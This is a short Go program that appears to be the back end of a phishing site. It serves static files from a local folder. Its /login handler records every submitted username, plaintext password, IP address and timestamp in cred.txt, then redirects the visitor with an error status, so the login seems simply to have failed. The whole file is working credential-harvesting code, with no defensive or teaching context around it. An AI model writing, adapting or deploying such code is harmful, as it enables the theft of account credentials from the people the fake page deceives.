package main

import (
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

func login(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":     time.Now().String(),
		"username": r.FormValue("username"),
		"pasword":  r.FormValue("password"),
		"ip":       r.RemoteAddr,
	}).Info("login Atempt")
	http.Redirect(w, r, "/", 500)
}
func main() {
	fh, err := os.OpenFile("cred.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("/home/alone/apper")))
	log.Fatal(http.ListenAndServe(":8080", r))
}